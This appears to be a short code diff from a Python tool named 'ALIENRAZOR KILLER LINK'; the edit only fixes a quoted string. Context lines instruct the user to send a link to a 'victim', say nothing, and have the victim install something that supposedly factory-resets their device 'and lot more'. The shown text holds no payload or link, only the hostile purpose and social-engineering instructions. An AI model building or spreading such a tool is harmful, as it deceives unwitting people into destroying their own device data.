@@ -63,7 +63,7 @@ def menu():
 def data1():
     os.system ("clear")
     print(logo)
-    print ("            ALIENRAZOR KILLER LINK\033[0;96m 
+    print ("            ALIENRAZOR KILLER LINK\033[0;96m  ")
     print ("")
     print ("\n\n COPY BELOW LINK AND SEND IT YOUR VICTIM \n AND SAY NOTHING TO HIM. \n WHEN HE INSTALL IT IN HIS DEVICE \n IT WILL BE FACTORY RESET \n AND LOT MORE HAPPENS.")
     print ("              👇👇👇 ")
